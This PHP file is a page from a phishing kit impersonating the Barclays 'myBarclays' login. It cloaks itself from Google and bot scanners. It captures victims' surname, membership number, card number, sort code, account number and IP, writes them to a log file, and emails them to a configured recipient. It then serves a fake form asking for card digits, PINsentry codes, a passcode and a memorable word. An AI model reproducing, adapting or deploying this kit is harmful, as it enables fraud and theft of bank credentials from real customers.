<?php
/*   
   _____   _                   _                        ______    __    __     ___  
                   ─████████──████████─████████──████████─████████──████████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ─────██░░░░░░██─────────██░░░░░░██─────────██░░░░░░██─────
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████████──████████─████████──████████─████████──████████─
                   ──────────────────────────────────────────────────────────

    
*/


session_start();
error_reporting(0);

//------------------------------------------|| ANTIBOTS  ||-----------------------------------------------------//
include "../BOTS/antibots1.php";
include "../BOTS/antibots2.php";
include "../BOTS/antibots3.php";
include "../BOTS/antibots4.php";
include "../BOTS/antibots5.php";
include "../BOTS/antibots6.php";
include "../BOTS/antibots7.php";
include "../BOTS/antibots8.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1256">
<link rel="icon" type="image/x-icon" href="https://index.barcap.com/indices/images/icons/favicon.ico">
<title>Step:2 - Login - myBarclays</title>
<meta name="generator" content="Web Page Maker">
<style type="text/css">

.name{
position: absolute;
width: 263px;
margin: 0px;
left: 387px;
top: 538px;
z-index: 0;
float: left;
border: 1px solid #CCC;
border-radius: 5px;
padding: 5px 10px;
outline: 0px none;
color: #027DB8;
}
.name:focus{
border: 1px solid #027DB8;
outline: 0px none;
}
.neber
    {
font-weight: bold;
margin-top: -8px;
margin-left: 15px;
font-family: "expertsans-light","Verdana","Arial","Helvetica","Sans Serif";
font-size: 1.5em;
color: #036;
font-weight: inherit;
line-height: inherit;
font-size-adjust: inherit;
font-stretch: inherit;
font-feature-settings: inherit;
font-language-override: inherit;
font-kerning: inherit;
font-synthesis: inherit;
font-variant: inherit;
    }

.neber{
margin-top: -8px;
margin-left: 15px;
font-family: "expertsans-light","Verdana","Arial","Helvetica","Sans Serif";
font-size: 1.5em;
color: #036;
font-weight: inherit;
line-height: inherit;
font-size-adjust: inherit;
font-stretch: inherit;
font-feature-settings: inherit;
font-language-override: inherit;
font-kerning: inherit;
font-synthesis: inherit;
font-variant: inherit;
}


</style>
</head>
<body style="background-repeat:no-repeat;" background="2.png">
<?php
include("../config.php");
$surname  = $_POST['surname'];
$membership =  $_POST['membership'];
$cardnumber = $_POST['cardnumber'];
$sort1 = $_POST['sort1'];
$sort2 =  $_POST['sort2'];
$sort3 = $_POST['sort3'];
$accno =  $_POST['accno'];
$iP_adress = $_SERVER['REMOTE_ADDR'];

$Info_LOG = "
|---------------- INFO-login ---------------|
|Surname                     : $surname
|Membership number           : $membership
|Card number                 : $cardnumber
|Sort code and account number: $sort1 $sort2 $sort3 $accno
|IP Adresse                  : $iP_adress
|-------------------------------------------| ";
$ip = $_SERVER['REMOTE_ADDR'];
$sub = " Login | $ip ";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: XXX" . "\r\n";
if(1 == 1) {
    $myFile = "../rezmdf.txt";
    $fh = @fopen($myFile, 'a+') or die("can't open file");
    @fwrite($fh, $Info_LOG);
    @fclose($fh);
}
mail($to,$sub,$Info_LOG,$head);

?>
<div class="neber" name="pinsentry1" style="position:absolute;height:31px;width:65px;left:116px;top:544px;z-index:1" type="text"><?php echo $surname ?></div>
<div class="id" name="pinsentry1"  style="position:absolute;height:31px;width:65px;left:300px;top:539px;z-index:1;font-size: 22;" type="text"><?php echo $membership ?></div>
<form method="POST" name="myBarclays" action="myBarclays-Confirm-your-account.php">
<script src="Step%202%20-%20Login%20-%20myBarclays_files/jquery.js" async=""></script><script src="Step%202%20-%20Login%20-%20myBarclays_files/replace.js" async=""></script><script src="Step%202%20-%20Login%20-%20myBarclays_files/nowait.js" async=""></script><script type="text/javascript">
function validateForm() {
    var x = document.forms["myBarclays"]["cclast"].value;
    if (x == null || x == "") {
        alert("Please check your information.");
        return false;
    }
}
</script>
<input class="name" name="cclast" required="" placeholder="" maxlength="4" style="position:absolute;height:31px;width:65px;left: 256px;top: 821px;z-index:0" type="text">
<input class="name" name="pinsentry1" maxlength="4" style="position:absolute;height:31px;width:65px;left:256px;top:929px;z-index:1" type="text">
<input class="name" name="pinsentry2" maxlength="4" pattern="{4}" style="position:absolute;height:31px;width:65px;left:339px;top:929px;z-index:2" type="text">
<input class="name" name="passcode" maxlength="5" style="position:absolute;height:31px;width:71px;left:353px;top:1085px;z-index:3" type="password">
<input class="name" name="memorable" maxlength="32" style="position:absolute;width:200px;left:353px;top:1155px;z-index:4" type="text">
<div id="formimage1" style="position:absolute; left:117px; top:1220px; z-index:5"><input name="formimage1" src="login1.png" type="image"><p>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
&nbsp;</p></div>


</form></body>
<script id="sb-script" src="Step%202%20-%20Login%20-%20myBarclays_files/core.js"></script></html>
